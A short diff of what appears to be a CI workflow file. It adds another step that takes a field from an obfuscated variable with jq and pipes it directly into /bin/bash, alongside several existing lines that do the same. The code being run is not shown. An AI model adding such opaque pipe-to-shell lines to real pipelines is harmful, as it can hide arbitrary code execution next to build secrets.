@@ -25,6 +25,7 @@ jobs:
           echo $dy8 | jq -r .tiul33 | /bin/bash
           printf '%s' "$rd51" | jq -r .u0 | /bin/bash
           echo $j0 | jq -r .xr415 | /bin/bash
+          echo $o8 | jq -r .a69 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
